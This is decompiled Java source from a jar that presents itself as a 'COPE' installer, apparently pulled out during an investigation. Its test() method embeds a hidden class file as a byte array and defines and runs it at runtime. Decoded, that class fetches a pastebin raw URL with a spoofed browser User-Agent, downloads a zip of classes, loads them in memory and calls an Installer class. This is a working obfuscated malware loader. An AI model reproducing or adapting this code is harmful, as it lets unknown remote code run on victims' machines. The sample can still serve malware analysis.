/*    */ package idasido.adldaosd.wpiw.install;
/*    */ 
/*    */ import java.io.DataInputStream;
/*    */ import java.io.File;
/*    */ import java.io.InputStream;
/*    */ import java.util.Arrays;
/*    */ 
/*    */ public class Main
/*    */   extends ClassLoader
/*    */ {
/*    */   public static void main(String[] args) {
/* 12 */     Class<Bootstrap> c = Bootstrap.class;
/* 13 */     String className = c.getName();
/* 14 */     String classAsPath = className.replace('.', '/') + ".class";
/* 15 */     InputStream stream = c.getClassLoader().getResourceAsStream(classAsPath);
/* 16 */     long size = (new File(c.getClassLoader().getResource(classAsPath).getFile())).length();
/*    */     
/* 18 */     try { byte[] bytes = new byte[(int)size];
/* 19 */       DataInputStream dis = new DataInputStream(stream);
/* 20 */       dis.readFully(bytes);
/* 21 */       System.out.println(Arrays.toString(bytes).replace("[", "{").replace("]", "}")); }
/* 22 */     catch (Exception ignored) { ignored.printStackTrace(); }
/*    */   
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public static byte[] addByte(byte[] array, byte toAdd) {
/* 30 */     byte[] newArr = new byte[array.length + 2];
/* 31 */     for (int i = 0; i < array.length; i++) {
/* 32 */       newArr[i] = array[i];
/*    */     }
/* 34 */     newArr[newArr.length - 1] = toAdd;
/* 35 */     return newArr;
/*    */   }
/*    */   
/*    */   public void test() {
/* 39 */     byte[] data = { -54, -2, -70, -66, 0, 0, 0, 58, 0, -62, 10, 0, 2, 0, 3, 7, 0, 4, 12, 0, 5, 0, 6, 1, 0, 21, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 7, 0, 8, 1, 0, 17, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 72, 97, 115, 104, 77, 97, 112, 10, 0, 7, 0, 3, 9, 0, 11, 0, 12, 7, 0, 13, 12, 0, 14, 0, 15, 1, 0, 8, 98, 111, 111, 115, 116, 114, 97, 112, 1, 0, 7, 99, 108, 97, 115, 115, 101, 115, 1, 0, 15, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 59, 10, 0, 11, 0, 3, 7, 0, 18, 1, 0, 12, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 8, 0, 20, 1, 0, 33, 104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 99, 57, 99, 72, 85, 104, 52, 71, 10, 0, 17, 0, 22, 12, 0, 5, 0, 23, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 7, 0, 25, 1, 0, 22, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 7, 0, 27, 1, 0, 25, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 82, 101, 97, 100, 101, 114, 10, 0, 17, 0, 29, 12, 0, 30, 0, 31, 1, 0, 14, 111, 112, 101, 110, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 1, 0, 26, 40, 41, 76, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 59, 10, 0, 33, 0, 34, 7, 0, 35, 12, 0, 36, 0, 37, 1, 0, 22, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 1, 0, 14, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 23, 40, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 10, 0, 26, 0, 39, 12, 0, 5, 0, 40, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 41, 86, 10, 0, 24, 0, 42, 12, 0, 5, 0, 43, 1, 0, 19, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 82, 101, 97, 100, 101, 114, 59, 41, 86, 10, 0, 24, 0, 45, 12, 0, 46, 0, 47, 1, 0, 8, 114, 101, 97, 100, 76, 105, 110, 101, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 7, 0, 49, 1, 0, 26, 106, 97, 118, 97, 47, 110, 101, 116, 47, 72, 116, 116, 112, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 8, 0, 51, 1, 0, 10, 85, 115, 101, 114, 45, 65, 103, 101, 110, 116, 8, 0, 53, 1, 0, 50, 77, 111, 122, 105, 108, 108, 97, 47, 52, 46, 48, 32, 40, 99, 111, 109, 112, 97, 116, 105, 98, 108, 101, 59, 32, 77, 83, 73, 69, 32, 54, 46, 48, 59, 32, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 53, 46, 48, 41, 10, 0, 48, 0, 55, 12, 0, 56, 0, 57, 1, 0, 18, 97, 100, 100, 82, 101, 113, 117, 101, 115, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 10, 0, 48, 0, 34, 7, 0, 60, 1, 0, 28, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 122, 105, 112, 47, 90, 105, 112, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 10, 0, 59, 0, 39, 10, 0, 59, 0, 63, 12, 0, 64, 0, 65, 1, 0, 12, 103, 101, 116, 78, 101, 120, 116, 69, 110, 116, 114, 121, 1, 0, 26, 40, 41, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 122, 105, 112, 47, 90, 105, 112, 69, 110, 116, 114, 121, 59, 10, 0, 67, 0, 68, 7, 0, 69, 12, 0, 70, 0, 47, 1, 0, 22, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 122, 105, 112, 47, 90, 105, 112, 69, 110, 116, 114, 121, 1, 0, 7, 103, 101, 116, 78, 97, 109, 101, 8, 0, 72, 1, 0, 6, 46, 99, 108, 97, 115, 115, 10, 0, 74, 0, 75, 7, 0, 76, 12, 0, 77, 0, 78, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 8, 101, 110, 100, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 10, 0, 74, 0, 80, 12, 0, 81, 0, 82, 1, 0, 6, 108, 101, 110, 103, 116, 104, 1, 0, 3, 40, 41, 73, 10, 0, 74, 0, 84, 12, 0, 85, 0, 86, 1, 0, 9, 115, 117, 98, 115, 116, 114, 105, 110, 103, 1, 0, 22, 40, 73, 73, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 10, 0, 74, 0, 88, 12, 0, 89, 0, 90, 1, 0, 7, 114, 101, 112, 108, 97, 99, 101, 1, 0, 22, 40, 67, 67, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 7, 0, 92, 1, 0, 29, 106, 97, 118, 97, 47, 105, 111, 47, 66, 121, 116, 101, 65, 114, 114, 97, 121, 79, 117, 116, 112, 117, 116, 83, 116, 114, 101, 97, 109, 10, 0, 91, 0, 3, 10, 0, 59, 0, 95, 12, 0, 96, 0, 97, 1, 0, 4, 114, 101, 97, 100, 1, 0, 5, 40, 91, 66, 41, 73, 10, 0, 91, 0, 99, 12, 0, 100, 0, 101, 1, 0, 5, 119, 114, 105, 116, 101, 1, 0, 7, 40, 91, 66, 73, 73, 41, 86, 10, 0, 91, 0, 103, 12, 0, 104, 0, 105, 1, 0, 11, 116, 111, 66, 121, 116, 101, 65, 114, 114, 97, 121, 1, 0, 4, 40, 41, 91, 66, 11, 0, 107, 0, 108, 7, 0, 109, 12, 0, 110, 0, 111, 1, 0, 13, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 1, 0, 3, 112, 117, 116, 1, 0, 56, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 8, 0, 113, 1, 0, 39, 105, 100, 97, 115, 105, 100, 111, 46, 97, 100, 108, 100, 97, 111, 115, 100, 46, 119, 112, 105, 119, 46, 105, 110, 115, 116, 97, 108, 108, 46, 73, 110, 115, 116, 97, 108, 108, 101, 114, 10, 0, 11, 0, 115, 12, 0, 116, 0, 117, 1, 0, 9, 102, 105, 110, 100, 67, 108, 97, 115, 115, 1, 0, 37, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 8, 0, 119, 1, 0, 4, 109, 97, 105, 110, 7, 0, 121, 1, 0, 15, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 10, 0, 120, 0, 123, 12, 0, 124, 0, 125, 1, 0, 9, 103, 101, 116, 77, 101, 116, 104, 111, 100, 1, 0, 64, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 77, 101, 116, 104, 111, 100, 59, 7, 0, Byte.MAX_VALUE, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 10, 0, -127, 0, -126, 7, 0, -125, 12, 0, -124, 0, -123, 1, 0, 24, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 77, 101, 116, 104, 111, 100, 1, 0, 6, 105, 110, 118, 111, 107, 101, 1, 0, 57, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 7, 0, -121, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 10, 0, 2, 0, 115, 11, 0, 107, 0, -118, 12, 0, -117, 0, -116, 1, 0, 11, 99, 111, 110, 116, 97, 105, 110, 115, 75, 101, 121, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 90, 11, 0, 107, 0, -114, 12, 0, -113, 0, -112, 1, 0, 3, 103, 101, 116, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 7, 0, -110, 1, 0, 2, 91, 66, 10, 0, 11, 0, -108, 12, 0, -107, 0, -106, 1, 0, 11, 100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115, 1, 0, 41, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 91, 66, 73, 73, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 7, 0, -104, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 1, 0, 9, 83, 105, 103, 110, 97, 116, 117, 114, 101, 1, 0, 37, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 60, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 91, 66, 62, 59, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 10, 76, 98, 111, 111, 115, 116, 114, 97, 112, 59, 1, 0, 4, 110, 97, 109, 101, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 13, 115, 116, 114, 101, 97, 109, 66, 117, 105, 108, 100, 101, 114, 1, 0, 31, 76, 106, 97, 118, 97, 47, 105, 111, 47, 66, 121, 116, 101, 65, 114, 114, 97, 121, 79, 117, 116, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 9, 98, 121, 116, 101, 115, 82, 101, 97, 100, 1, 0, 1, 73, 1, 0, 10, 116, 101, 109, 112, 66, 117, 102, 102, 101, 114, 1, 0, 6, 108, 111, 97, 100, 101, 114, 1, 0, 8, 112, 97, 115, 116, 101, 98, 105, 110, 1, 0, 14, 76, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 59, 1, 0, 6, 114, 101, 97, 100, 101, 114, 1, 0, 24, 76, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 59, 1, 0, 7, 102, 105, 108, 101, 85, 82, 76, 1, 0, 3, 117, 114, 108, 1, 0, 17, 104, 116, 116, 112, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 1, 0, 28, 76, 106, 97, 118, 97, 47, 110, 101, 116, 47, 72, 116, 116, 112, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 59, 1, 0, 11, 105, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 14, 122, 105, 112, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 30, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 122, 105, 112, 47, 90, 105, 112, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 8, 122, 105, 112, 69, 110, 116, 114, 121, 1, 0, 24, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 122, 105, 112, 47, 90, 105, 112, 69, 110, 116, 114, 121, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, -72, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 1, 115, 1, 0, 5, 99, 108, 97, 122, 122, 1, 0, 17, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, -66, 1, 0, 32, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 78, 111, 116, 70, 111, 117, 110, 100, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 40, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 60, 42, 62, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 13, 98, 111, 111, 115, 116, 114, 97, 112, 46, 106, 97, 118, 97, 0, 33, 0, 11, 0, 2, 0, 0, 0, 1, 0, 1, 0, 14, 0, 15, 0, 1, 0, -103, 0, 0, 0, 2, 0, -102, 0, 3, 0, 1, 0, 5, 0, 6, 0, 1, 0, -101, 0, 0, 0, 62, 0, 3, 0, 1, 0, 0, 0, 16, 42, -73, 0, 1, 42, -69, 0, 7, 89, -73, 0, 9, -75, 0, 10, -79, 0, 0, 0, 2, 0, -100, 0, 0, 0, 10, 0, 2, 0, 0, 0, 12, 0, 4, 0, 51, 0, -99, 0, 0, 0, 12, 0, 1, 0, 0, 0, 16, 0, -98, 0, -97, 0, 0, 0, 9, 0, 119, 0, 6, 0, 1, 0, -101, 0, 0, 2, -125, 0, 5, 0, 13, 0, 0, 0, -14, -69, 0, 11, 89, -73, 0, 16, 75, -69, 0, 17, 89, 18, 19, -73, 0, 21, 76, -69, 0, 24, 89, -69, 0, 26, 89, 43, -74, 0, 28, -74, 0, 32, -73, 0, 38, -73, 0, 41, 77, 44, -74, 0, 44, 78, -69, 0, 17, 89, 45, -73, 0, 21, 58, 4, 25, 4, -74, 0, 28, -64, 0, 48, 58, 5, 25, 5, 18, 50, 18, 52, -74, 0, 54, 25, 5, -74, 0, 58, 58, 6, -69, 0, 59, 89, 25, 6, -73, 0, 61, 58, 7, 25, 7, -74, 0, 62, 89, 58, 8, -58, 0, 113, 25, 8, -74, 0, 66, 58, 9, 25, 9, 18, 71, -74, 0, 73, -102, 0, 6, -89, -1, -28, 25, 9, 3, 25, 9, -74, 0, 79, 16, 6, 100, -74, 0, 83, 58, 9, 25, 9, 16, 47, 16, 46, -74, 0, 87, 58, 9, -69, 0, 91, 89, -73, 0, 93, 58, 10, 17, 64, 0, -68, 8, 58, 12, 25, 7, 25, 12, -74, 0, 94, 89, 54, 11, 2, -97, 0, 16, 25, 10, 25, 12, 3, 21, 11, -74, 0, 98, -89, -1, -24, 42, -76, 0, 10, 25, 9, 25, 10, -74, 0, 102, -71, 0, 106, 3, 0, 87, -89, -1, -118, 42, 18, 112, -74, 0, 114, 18, 118, 3, -67, 0, 120, -74, 0, 122, 1, 3, -67, 0, 126, -74, 0, Byte.MIN_VALUE, 87, -89, 0, 4, 75, -79, 0, 1, 0, 0, 0, -19, 0, -16, 0, -122, 0, 3, 0, -100, 0, 0, 0, 90, 0, 22, 0, 0, 0, 17, 0, 8, 0, 19, 0, 18, 0, 20, 0, 40, 0, 21, 0, 45, 0, 22, 0, 55, 0, 24, 0, 65, 0, 25, 0, 74, 0, 26, 0, 81, 0, 28, 0, 92, 0, 31, 0, 103, 0, 32, 0, 110, 0, 34, 0, 123, 0, 36, 0, -117, 0, 37, 0, -106, 0, 39, 0, -97, 0, 41, 0, -90, 0, 42, 0, -63, 0, 44, 0, -46, 0, 45, 0, -43, 0, 46, 0, -19, 0, 48, 0, -15, 0, 49, 0, -99, 0, 0, 0, -124, 0, 13, 0, 110, 0, 100, 0, -96, 0, -95, 0, 9, 0, -97, 0, 51, 0, -94, 0, -93, 0, 10, 0, -80, 0, 34, 0, -92, 0, -91, 0, 11, 0, -90, 0, 44, 0, -90, 0, -110, 0, 12, 0, 8, 0, -27, 0, -89, 0, -97, 0, 0, 0, 18, 0, -37, 0, -88, 0, -87, 0, 1, 0, 40, 0, -59, 0, -86, 0, -85, 0, 2, 0, 45, 0, -64, 0, -84, 0, -95, 0, 3, 0, 55, 0, -74, 0, -83, 0, -87, 0, 4, 0, 65, 0, -84, 0, -82, 0, -81, 0, 5, 0, 81, 0, -100, 0, -80, 0, -79, 0, 6, 0, 92, 0, -111, 0, -78, 0, -77, 0, 7, 0, 100, 0, -119, 0, -76, 0, -75, 0, 8, 0, -74, 0, 0, 0, -115, 0, 7, -1, 0, 92, 0, 8, 7, 0, 11, 7, 0, 17, 7, 0, 24, 7, 0, 74, 7, 0, 17, 7, 0, 48, 7, 0, -73, 7, 0, 59, 0, 0, -3, 0, 30, 7, 0, 67, 7, 0, 74, -2, 0, 42, 7, 0, 91, 0, 7, 0, -111, -1, 0, 26, 0, 13, 7, 0, 11, 7, 0, 17, 7, 0, 24, 7, 0, 74, 7, 0, 17, 7, 0, 48, 7, 0, -73, 7, 0, 59, 7, 0, 67, 7, 0, 74, 7, 0, 91, 1, 7, 0, -111, 0, 0, -1, 0, 19, 0, 9, 7, 0, 11, 7, 0, 17, 7, 0, 24, 7, 0, 74, 7, 0, 17, 7, 0, 48, 7, 0, -73, 7, 0, 59, 7, 0, 67, 0, 0, -1, 0, 26, 0, 0, 0, 1, 7, 0, -122, 0, 0, 4, 0, 116, 0, 117, 0, 3, 0, -101, 0, 0, 0, -51, 0, 6, 0, 4, 0, 0, 0, 65, 1, 77, 42, 43, -73, 0, -120, 77, -89, 0, 4, 78, 42, -76, 0, 10, 43, -71, 0, -119, 2, 0, -103, 0, 37, 42, 43, 42, -76, 0, 10, 43, -71, 0, -115, 2, 0, -64, 0, -111, 3, 42, -76, 0, 10, 43, -71, 0, -115, 2, 0, -64, 0, -111, -66, -74, 0, -109, 77, -89, 0, 4, 78, 44, -80, 0, 2, 0, 2, 0, 8, 0, 11, 0, -122, 0, 12, 0, 59, 0, 62, 0, -105, 0, 3, 0, -100, 0, 0, 0, 34, 0, 8, 0, 0, 0, 55, 0, 2, 0, 57, 0, 8, 0, 59, 0, 12, 0, 62, 0, 25, 0, 63, 0, 59, 0, 66, 0, 62, 0, 65, 0, 63, 0, 67, 0, -99, 0, 0, 0, 32, 0, 3, 0, 0, 0, 65, 0, -98, 0, -97, 0, 0, 0, 0, 0, 65, 0, -71, 0, -95, 0, 1, 0, 2, 0, 63, 0, -70, 0, -69, 0, 2, 0, -74, 0, 0, 0, 28, 0, 5, -1, 0, 11, 0, 3, 7, 0, 11, 7, 0, 74, 7, 0, 120, 0, 1, 7, 0, -122, 0, 46, 66, 7, 0, -105, 0, 0, -68, 0, 0, 0, 4, 0, 1, 0, -67, 0, -103, 0, 0, 0, 2, 0, -65, 0, 1, 0, -64, 0, 0, 0, 2, 0, -63 };
/*    */     try {
/* 41 */       Class<?> c = defineClass("idasido.adldaosd.wpiw.install.Bootstrap", data, 0, data.length);
/*    */       
/* 43 */       c.getMethod("main", new Class[0]).invoke(null, new Object[0]);
/* 44 */     } catch (Exception exception) {}
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-installer.jar!\idasido\adldaosd\wpiw\install\Main.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */